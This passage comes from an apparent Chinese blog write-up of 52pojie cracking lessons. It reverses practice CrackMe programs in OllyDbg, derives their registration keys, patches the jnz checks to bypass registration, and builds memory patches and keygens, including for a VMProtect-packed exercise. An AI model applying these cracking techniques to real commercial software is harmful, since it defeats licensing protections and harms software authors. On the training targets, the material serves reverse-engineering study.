class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">004029D3  |.  E8 7F590100   call 吾爱破解.00418357                       ;  GetWindowTextA函数所在</span><br><span class="line">004029D8  |.  8B4D EC       mov ecx,[local.5]                        ;  字符串存进ecx</span><br><span class="line">004029DB  |.  8B79 F4       mov edi,dword ptr ds:[ecx-0xC]           ;  字符串长度存进edi</span><br><span class="line">004029DE  |.  85FF          test edi,edi</span><br><span class="line">004029E0  |.  74 1A         je short 吾爱破解.004029FC                   ;  字符串长度为0跳转</span><br><span class="line">004029E2  |.  33D2          xor edx,edx                              ;  edx清零</span><br><span class="line">004029E4  |.  85FF          test edi,edi</span><br><span class="line">004029E6  |.  7E 14         jle short 吾爱破解.004029FC                  ;  字符串长度小于等于0跳转</span><br><span class="line">004029E8  |&gt;  85D2          /test edx,edx</span><br><span class="line">004029EA  |.  78 36         |js short 吾爱破解.00402A22                  ;  结果为负跳转</span><br><span class="line">004029EC  |.  3BD7          |cmp edx,edi</span><br><span class="line">004029EE  |.  7F 32         |jg short 吾爱破解.00402A22                  ;  大于跳转</span><br><span class="line">004029F0  |.  803C0A 2D     |cmp byte ptr ds:[edx+ecx],0x2D          ;  判断字符是否是“-”</span><br><span class="line">004029F4  |.  75 01         |jnz short 吾爱破解.004029F7                 ;  不是指向下一个字符</span><br><span class="line">004029F6  |.  46            |inc esi                                 ;  是就+1</span><br><span class="line">004029F7  |&gt;  42            |inc edx</span><br><span class="line">004029F8  |.  3BD7          |cmp edx,edi</span><br><span class="line">004029FA  |.^ 7C EC         \jl short 吾爱破解.004029E8                  ;  遍历完字符串退出循环</span><br><span class="line">004029FC  |&gt;  C1E6 04       shl esi,0x4</span><br><span class="line">004029FF  |.  83EE 02       sub esi,0x2</span><br><span class="line">00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD</span><br><span class="line">00402A07  |.  F7E6          mul esi</span><br><span class="line">;执行完这条指令后edx的值被覆盖，所以下面的0x18不能看作是字符串长度，字符串长度存储在edi里</span><br><span class="line">00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18</span><br><span class="line">00402A0C  |.  BE FFFFFFFF   mov esi,-0x1                  </span><br><span class="line">00402A11  |.  83EA 03       sub edx,0x3                              ;  根据下面跳转判断edx=3</span><br><span class="line">00402A14  |.  0F85 C8020000 jnz 吾爱破解.00402CE2                        ;  不为0跳转，这里跳转绕过注册成功</span><br><span class="line">00402A1A  |.  85FF          test edi,edi</span><br><span class="line">00402A1C  |.  7F 0E         jg short 吾爱破解.00402A2C</span><br><span class="line">00402A1E  |.  0BF6          or esi,esi</span><br><span class="line">00402A20  |.  EB 23         jmp short 吾爱破解.00402A45</span><br><span class="line">00402A22  |&gt;  68 57000780   push 0x80070057</span><br><span class="line">00402A27  |.  E8 C4E9FFFF   call 吾爱破解.004013F0</span><br><span class="line">00402A2C  |&gt;  6A 2D         push 0x2D</span><br><span class="line">00402A2E  |.  51            push ecx</span><br><span class="line">00402A2F  |.  E8 D4921100   call 吾爱破解.0051BD08</span><br></pre></td></tr></table></figure><p>进一步分析这几条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004029FC  |&gt; \C1E6 04       shl esi,0x4                              ;  从下面逆推0x20右移4位为2，所以“-”的个数为2</span><br><span class="line">004029FF  |.  83EE 02       sub esi,0x2                              ;  要使下面的edx=0x18,这里esi=0x1E+2=0x20才对</span><br><span class="line"> ;  esi=18 66666666除以CCCCCCCD=0X1E</span><br><span class="line">00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD</span><br><span class="line">00402A07  |.  F7E6          mul esi                                  ;  edx拼接eax=esi*eax要等于00000018 66666666</span><br><span class="line">00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18</span><br></pre></td></tr></table></figure><p>懂了，所以字符串中需要两个“-”号。输入<code>1234567-89012345-6789012</code>试试(“-”号位置任意)。</p><img src="/posts/bb44dc0/-.png" class="" title="输入字符串"><p>发现注册成功。注册成功后会在目录下生成.txt，.ini文件，写入注册表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">52pojie.txt</span><br><span class="line">1234567</span><br><span class="line"></span><br><span class="line">52pojie.ini</span><br><span class="line">[验证]</span><br><span class="line">Key=89012345</span><br><span class="line"></span><br><span class="line">注册表</span><br><span class="line">6789012</span><br></pre></td></tr></table></figure><p>从上面的分析中已经知道.txt文件的注册码是<code>ITN3UXJGJ</code>，改了再说，这里是9个字符。这时再下断<code>GetPrivateProfileStringA</code>函数，程序就会经过这个算法。此时就可以分析算法了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00402198  |.  FF15 1C345400 call dword ptr ds:[&lt;&amp;KERNEL32.GetPrivate&gt;; \GetPrivateProfileStringA</span><br><span class="line">0040219E  |.  5E            pop esi</span><br><span class="line">0040219F  |.  85C0          test eax,eax                             ;  ini文件的字符串长度</span><br><span class="line">004021A1  |.  74 4D         je short 吾爱破解.004021F0                   ;  字符串长度为0跳转</span><br><span class="line">004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  ecx等于字符串</span><br><span class="line">004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004021B0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]</span><br><span class="line">004021B2  |.  41            |inc ecx                                 ;  指针+1指向下个字符</span><br><span class="line">004021B3  |.  84C0          |test al,al</span><br><span class="line">004021B5  |.^ 75 F9         \jnz short 吾爱破解.004021B0                 ;  遍历字符串</span><br><span class="line">004021B7  |.  2BCA          sub ecx,edx                              ;  ecx存进字符串长度</span><br><span class="line">004021B9  |.  83F9 0E       cmp ecx,0xE                              ;  ini文件中字符串长度为14</span><br><span class="line">004021BC  |.  75 32         jnz short 吾爱破解.004021F0</span><br><span class="line">004021BE  |.  33C0          xor eax,eax                              ;  eax清零</span><br><span class="line">004021C0  |&gt;  0FB69405 E4FE&gt;/movzx edx,byte ptr ss:[ebp+eax-0x11C]   ;  将真正的注册码存入edx</span><br><span class="line">004021C8  |.  0FBE8C05 F4FE&gt;|movsx ecx,byte ptr ss:[ebp+eax-0x10C]   ;  将输入的字符串存入ecx</span><br><span class="line">004021D0  |.  83C2 30       |add edx,0x30                            ;  将真正的注册码+0x30</span><br><span class="line">004021D3  |.  3BD1          |cmp edx,ecx                             ;  与输入的字符串对比</span><br><span class="line">004021D5  |.  75 19         |jnz short 吾爱破解.004021F0</span><br><span class="line">004021D7  |.  40            |inc eax</span><br><span class="line">004021D8  |.  83F8 0E       |cmp eax,0xE</span><br><span class="line">004021DB  |.^ 72 E3         \jb short 吾爱破解.004021C0</span><br></pre></td></tr></table></figure><p>在数据窗口Ctrl+G输入<code>ebp+eax-0x11c</code>，第1行就是真正的注册码，第2行是输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012F33C  3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A 00 00  :%(H:%(..</span><br><span class="line">0012F34C  38 39 30 31 34 35 36 37 38 39 30 31 32 31 00 00  89014567890121..</span><br></pre></td></tr></table></figure><p>将真正的注册码+0x30就是我们要输入的字符串<code>jN2UXJxEjM2UXJ</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A</span><br></pre></td></tr></table></figure><p>将目录下的.ini文件信息修改为以上字符串。</p><p>注册表部分。在反汇编窗口右键-&gt;查找-&gt;所有模块间的调用，搜索<code>RegQueryValueExA</code>函数，右键-&gt;在每个调用到<code>RegQueryValueExA</code>上设置断点。找到有比较算法那个，分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00402285  |.  FF15 24305400 call dword ptr ds:[&lt;&amp;ADVAPI32.RegQueryVa&gt;; \RegQueryValueExA</span><br><span class="line">0040228B  |.  85C0          test eax,eax</span><br><span class="line">0040228D  |.  0F85 E1000000 jnz 吾爱破解.00402374</span><br><span class="line">00402293  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  输入的字符串</span><br><span class="line">00402299  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]</span><br><span class="line">0040229C  |.  8D6424 00     lea esp,dword ptr ss:[esp]</span><br><span class="line">004022A0  |&gt;  8A01          /mov al,byte ptr ds:[ecx]</span><br><span class="line">004022A2  |.  41            |inc ecx</span><br><span class="line">004022A3  |.  84C0          |test al,al</span><br><span class="line">004022A5  |.^ 75 F9         \jnz short 吾爱破解.004022A0                 ;  遍历字符串</span><br><span class="line">004022A7  |.  2BCA          sub ecx,edx                              ;  ecx=字符串长度=9</span><br><span class="line">004022A9  |.  83C1 06       add ecx,0x6                              ;  所以ecx=字符串长度+6=0xF</span><br><span class="line">004022AC  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD</span><br><span class="line">004022B1  |.  F7E1          mul ecx                                  ;  要使得edx拼接eax=ecx*eax=C 33333336</span><br><span class="line">004022B3  |.  C1EA 02       shr edx,0x2                              ;  edx=0x0C</span><br><span class="line">004022B6  |.  83EA 03       sub edx,0x3                              ;  edx=0x3</span><br><span class="line">004022B9  |.  0F85 B5000000 jnz 吾爱破解.00402374                        ;  退出函数，不能跳</span><br><span class="line">004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C</span><br></pre></td></tr></table></figure><p>所以注册表的注册码是9个字符，修改修改再继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C                       ;  mov eax=lJT</span><br><span class="line">004022C4  |.  8BC8              mov ecx,eax</span><br><span class="line">004022C6  |.  85C9              test ecx,ecx</span><br><span class="line">004022C8  |.  0F84 C3000000     je 吾爱破解.00402391</span><br><span class="line">004022CE  |.  8B01              mov eax,dword ptr ds:[ecx]               ;  eax=lJT.</span><br><span class="line">004022D0  |.  FF50 0C           call dword ptr ds:[eax+0xC]              ;  eax指向地址58E5E0,也就是lJT.的下一地址</span><br><span class="line">004022D3  |.  8A95 F8FEFFFF     mov dl,byte ptr ss:[ebp-0x108]           ;  dl指向输入的字符第五个字符的地址</span><br><span class="line">004022D9  |.  8D70 10           lea esi,dword ptr ds:[eax+0x10]          ;  esi=58e5f0</span><br><span class="line">004022DC  |.  0FBE85 F4FEFFFF   movsx eax,byte ptr ss:[ebp-0x10C]        ;  eax=字符串的第1个字符</span><br><span class="line">004022E3  |.  0FBECA            movsx ecx,dl                             ;  ecx=字符串的第5个字符</span><br><span class="line">004022E6  |.  48                dec eax                                  ;  eax=eax-1</span><br><span class="line">004022E7  |.  89B5 E4FEFFFF     mov [local.71],esi                       ;  吾爱破解.0058E5F0</span><br><span class="line">004022ED  |.  3BC1              cmp eax,ecx                              ;  str[0]-1==str[4]</span><br><span class="line">004022EF  |.  75 69             jnz short 吾爱破解.0040235A                  ;  不能跳</span><br></pre></td></tr></table></figure><p>字符串中第1个字符要比第5个字符大1，修改修改继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004022F1  |.  0FBE85 FCFEFFFF   movsx eax,byte ptr ss:[ebp-0x104]        ;  eax=输入的第9个字符</span><br><span class="line">004022F8  |.  83C1 02           add ecx,0x2</span><br><span class="line">004022FB  |.  3BC8              cmp ecx,eax                              ;  str[8]==str[4]+2</span><br><span class="line">004022FD  |.  75 5B             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>字符串中第9个字符要比第5个字符大2，修改修改继续。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004022FF  |.  80F2 54           xor dl,0x54                              ;  dl是第5个字符</span><br><span class="line">00402302  |.  80FA 66           cmp dl,0x66                              ;  第5个字符与0x54异或要等于0x66</span><br><span class="line">00402305  |.  75 53             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>所以第5个字符是0x32(‘2’)，也可以推算出，第1个字符是’3’，第9个字符是’4’。修改修改再继续。push了3个参数，第一个参数是长度，第二个参数是”MjM”，第三个参数是字符串的第2个字符的地址。猜测这个函数是比较2-4位是否为”MjM”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402307  |.  6A 03             push 0x3</span><br><span class="line">00402309  |.  8D85 F5FEFFFF     lea eax,dword ptr ss:[ebp-0x10B]         ;  eax=字符串的第2个字符地址</span><br><span class="line">0040230F  |.  68 3C465400       push 吾爱破解.0054463C                       ;  MjM</span><br><span class="line">00402314  |.  50                push eax</span><br><span class="line">00402315  |.  E8 76991100       call 吾爱破解.0051BC90</span><br><span class="line">0040231A  |.  83C4 0C           add esp,0xC</span><br><span class="line">0040231D  |.  85C0              test eax,eax</span><br><span class="line">0040231F  |.  75 39             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>修改一下试试。跳转没有实现，猜测正确。下面是一样的步骤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402321  |.  6A 03             push 0x3</span><br><span class="line">00402323  |.  8D85 F9FEFFFF     lea eax,dword ptr ss:[ebp-0x107]         ;  eax=第6个字符地址</span><br><span class="line">00402329  |.  68 40465400       push 吾爱破解.00544640                       ;  UXJ</span><br><span class="line">0040232E  |.  50                push eax</span><br><span class="line">0040232F  |.  E8 5C991100       call 吾爱破解.0051BC90</span><br><span class="line">00402334  |.  83C4 0C           add esp,0xC</span><br><span class="line">00402337  |.  85C0              test eax,eax</span><br><span class="line">00402339  |.  75 1F             jnz short 吾爱破解.0040235A</span><br></pre></td></tr></table></figure><p>综上，注册表的注册码为<code>3MjM2UXJ4</code>。</p><p>完整注册码为<code>ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4</code>，得到彩蛋。</p><img src="/posts/bb44dc0/%E5%BD%A9%E8%9B%8B2.png" class="" title="彩蛋2"><img src="/posts/bb44dc0/%E6%88%91%E6%98%AF%E5%BD%A9%E8%9B%8B.png" class="" title="彩蛋2"><p>点击“我是彩蛋”有一连串的弹窗提示。这些弹窗语句早在我们搜索字符串的时候就已经看到了。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B22.png" class="" title="搜索字符串"><p>Key1=ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4</p><p>Key2_1=4JXU2MjM3-JXU2MjExJXU2Nj-JGJXU3NTl</p><p>Key2_2=3MjM2UXJ4-jN2UXJxEjM2UXJ-ITN3UXJGJ</p><p>Key2_3=JGJXU3NTl-JXU2MjExJXU2Nj-4JXU2MjM3</p><p>Key2的所有数字之和长度之间的差为4，且比长度大。所以彩蛋Key长度为12。</p><p>Key的倒数第二位为2，最后一位为=。Key=00000000002=</p><p>Key的第一位是什么呢？B，我们经常说的，NB！Key=N0000000002=</p><p>Key的倒数第三位是Key2的第三位？J、j、X？</p><p>Key的第二位为管理员名字的首字母，管理员是Hmily，所以是H，Key=NH000000002=</p><p>Key的第三位和第九位一样，都是第五位的小写字母。</p><p>好难猜啊…我看到答案是NHlkLXpdIU2=，但完全不知道怎么得来的。</p><h1 id="5-给程序打补丁"><a href="#5-给程序打补丁" class="headerlink" title="5. 给程序打补丁"></a>5. 给程序打补丁</h1><p>吾爱破解内存补丁生成器V1.00：做程序补丁</p><p>KeyMake V2.0 修改版：做内存注册机</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E5%A4%B1%E8%B4%A5.png" class="" title="注册失败"><p>拉进OD，查找敏感字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040342B  |. /75 07         jnz short 第六课例.00403434</span><br><span class="line">0040342D  |. |68 78E15700   push 第六课例.0057E178                       ;  注册成功</span><br><span class="line">00403432  |. |EB 10         jmp short 第六课例.00403444</span><br><span class="line">00403434  |&gt; \68 84E15700   push 第六课例.0057E184                       ;  注册失败</span><br><span class="line">00403439  |.  EB 09         jmp short 第六课例.00403444</span><br><span class="line">0040343B  |&gt;  6A 00         push 0x0</span><br><span class="line">0040343D  |.  6A 00         push 0x0</span><br><span class="line">0040343F  |.  68 6CE15700   push 第六课例.0057E16C                       ;  输入为空</span><br><span class="line">00403444  |&gt;  E8 67080100   call 第六课例.00413CB0</span><br></pre></td></tr></table></figure><p>爆破补丁版：将地址为<code>40342B</code>的<code>jnz</code>直接修改为<code>jz</code>或<code>nop</code>即可。</p><p>那如果使用吾爱破解内存补丁生成器V1.00爆破要怎么操作呢？找到需要修改的地址后，打开补丁生成器，将程序拖入补丁生成器中，输入内存地址和需要修改成什么指令，添加指令，导出补丁。</p><img src="/posts/bb44dc0/%E8%A1%A5%E4%B8%81.png" class="" title="打补丁"><p>关闭OD后打开补丁程序，点击“开始补丁”就会自动运行补丁程序，此时输入什么都可以注册成功了。</p><img src="/posts/bb44dc0/%E8%A1%A5%E4%B8%81%E6%88%90%E5%8A%9F.png" class="" title="打补丁"><p>注册机版：向上划到段首下断运行，F8单步到此处。寄存器窗口和堆栈窗口都可看到真正的注册码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00403400  |&gt; /8A10          /mov dl,byte ptr ds:[eax]                ;  eax指向真正的注册码</span><br><span class="line">00403402  |. |3A11          |cmp dl,byte ptr ds:[ecx]                ;  ecx指向输入的注册码</span><br><span class="line">00403404  |. |75 1A         |jnz short 第六课例.00403420</span><br><span class="line">00403406  |. |84D2          |test dl,dl</span><br><span class="line">00403408  |. |74 12         |je short 第六课例.0040341C</span><br><span class="line">0040340A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040340D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00403410  |. |75 0E         |jnz short 第六课例.00403420</span><br><span class="line">00403412  |. |83C0 02       |add eax,0x2</span><br><span class="line">00403415  |. |83C1 02       |add ecx,0x2</span><br><span class="line">00403418  |. |84D2          |test dl,dl</span><br><span class="line">0040341A  |.^\75 E4         \jnz short 第六课例.00403400</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012F6EC   186B4420</span><br><span class="line">0012F6F0   00000111</span><br><span class="line">0012F6F4   00000000</span><br><span class="line">0012F6F8   00194078  ASCII &quot;202CB962AC59075B964B07152D234B70&quot;</span><br><span class="line">0012F6FC   00194078  ASCII &quot;202CB962AC59075B964B07152D234B70&quot;</span><br><span class="line">0012F700   00192828  ASCII &quot;852&quot;</span><br><span class="line">0012F704   001927B8  ASCII &quot;123&quot;</span><br></pre></td></tr></table></figure><p>记下运行到<code>403400</code>，真正的注册码存在了寄存器窗口的eax的值(注册码字符串的首地址)里。</p><p>打开Keymake，其它-&gt;内存注册机，将需要制作注册机的程序加载进来，添加。编辑信息-&gt;添加-&gt;生成。</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E6%9C%BA.png" class="" title="注册机"><p>运行注册机，发现需要两个框都填了才能给注册码，否则提示“输入为空”。为了美观，也可将<code>004033A7</code>的跳转指令nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00403384  |.  50            push eax                                 ;  将用户名入栈</span><br><span class="line">00403385  |.  8D8F 30010000 lea ecx,dword ptr ds:[edi+0x130]</span><br><span class="line">0040338B  |.  E8 12630100   call 第六课例.004196A2</span><br><span class="line">00403390  |.  8B45 EC       mov eax,[local.5]                        ;  eax=用户名</span><br><span class="line">00403393  |.  83CF FF       or edi,-0x1</span><br><span class="line">00403396  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">0040339A  |.  0F84 9B000000 je 第六课例.0040343B                         ;  用户名为空跳转</span><br><span class="line">004033A0  |.  8B45 E8       mov eax,[local.6]</span><br><span class="line">004033A3  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">004033A7  |.  0F84 8E000000 je 第六课例.0040343B                         ;  注册码为空跳转</span><br></pre></td></tr></table></figure><p>nop掉后再生成注册机。虽然不会提示“输入为空”，但也会提示“注册失败”字样，暂时没有什么好的办法，就这样吧。(提示“输入为空”比“注册失败”要好，还是别改了吧)</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E7%A0%812.png" class="" title="注册码"><p>也可以用Keymake制作内存补丁，<a href="https://www.bilibili.com/video/BV1cw411Z7Ab?p=22">Shark恒 制作内存补丁</a> 。</p><h1 id="6-打补丁作业"><a href="#6-打补丁作业" class="headerlink" title="6. 打补丁作业"></a>6. 打补丁作业</h1><p>程序加了VMProtect壳。VMProtect 是软件保护系统，将保护后的代码放到虚拟机中运行，这将使分析反编译后的代码和破解变得极为困难。这个我目前还不会手脱，那就在有壳的基础上修改吧。</p><p>F9运行程序跑起来，进入OD的<code>E</code>模块，双击进入程序代码块(.exe)。取消分析，智能搜索发现字符串都能看到了。搜索敏感字符串进入反汇编代码，还是熟悉的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040346B   /75 07           jnz short 吾爱破解.00403474</span><br><span class="line">0040346D   |68 80E15700     push 吾爱破解.0057E180                       ; 注册成功</span><br><span class="line">00403472   |EB 10           jmp short 吾爱破解.00403484</span><br><span class="line">00403474   \68 8CE15700     push 吾爱破解.0057E18C                       ; 注册失败</span><br><span class="line">00403479    EB 09           jmp short 吾爱破解.00403484</span><br><span class="line">0040347B    6A 00           push 0x0</span><br><span class="line">0040347D    6A 00           push 0x0</span><br><span class="line">0040347F    68 6CE15700     push 吾爱破解.0057E16C                       ; 输入为空</span><br><span class="line">00403484    E8 78080100     call 吾爱破解.00413D01</span><br></pre></td></tr></table></figure><p>爆破补丁版：</p><p>但发现这样nop后保存文件会提示“无法定位数据”。</p><img src="/posts/bb44dc0/%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8D%E6%95%B0%E6%8D%AE.png" class="" title="无法定位数据"><p>这时就需要吾爱破解内存补丁生成器V1.00了。<code>jnz</code>的机器码为0x75，<code>je</code>指令为0x74，<code>nop</code>的机器码为0x90。关闭OD再运行补丁。</p><p>注册机版：</p><p>由于程序有壳，无法重新载入，但还是可以在这个函数中一步步运行程序到算法处，按照5的方法生成注册机即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00403440  |&gt;  8A10          /mov dl,byte ptr ds:[eax];真正注册码</span><br><span class="line">00403442  |. |3A11          |cmp dl,byte ptr ds:[ecx];输入的字符串</span><br><span class="line">00403444  |. |75 1A         |jnz short 吾爱破解.00403460</span><br><span class="line">00403446  |. |84D2          |test dl,dl</span><br><span class="line">00403448  |. |74 12         |je short 吾爱破解.0040345C</span><br><span class="line">0040344A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040344D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00403450  |. |75 0E         |jnz short 吾爱破解.00403460</span><br><span class="line">00403452  |. |83C0 02       |add eax,0x2</span><br><span class="line">00403455  |. |83C1 02       |add ecx,0x2</span><br><span class="line">00403458  |. |84D2          |test dl,dl</span><br><span class="line">0040345A  |.^\75 E4         \jnz short 吾爱破解.00403440</span><br></pre></td></tr></table></figure><p>分析算法：</p><p>在段首下断，输入用户名和注册码后运行，程序停在断点处。F8一步步跟，分析每一步程序做了什么。执行完<code>4033BF</code>地址的指令后，可以看到堆栈窗口中用户名和“123456”拼接在一起。</p><img src="/posts/bb44dc0/%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="连接字符串"><p>执行完<code>4033FE</code>地址的指令后，堆栈窗口出现真正的注册码。</p><img src="/posts/bb44dc0/%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C%E7%A0%81.png" class="" title="真正的注册码"><p>那我们进去看看它是怎么生成的。看到这一大段就应该意识到这是MD5的初始化处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00401B55    C745 D8 0000000&gt;mov dword ptr ss:[ebp-0x28],0x0</span><br><span class="line">00401B5C    C745 D4 0000000&gt;mov dword ptr ss:[ebp-0x2C],0x0</span><br><span class="line">00401B63    C745 DC 0123456&gt;mov dword ptr ss:[ebp-0x24],0x67452301</span><br><span class="line">00401B6A    C745 E0 89ABCDE&gt;mov dword ptr ss:[ebp-0x20],0xEFCDAB89</span><br><span class="line">00401B71    C745 E4 FEDCBA9&gt;mov dword ptr ss:[ebp-0x1C],0x98BADCFE</span><br><span class="line">00401B78    C745 E8 7654321&gt;mov dword ptr ss:[ebp-0x18],0x10325476</span><br><span class="line">00401B7F    C645 FC 02      mov byte ptr ss:[ebp-0x4],0x2</span><br><span class="line">00401B83    8B45 08         mov eax,dword ptr 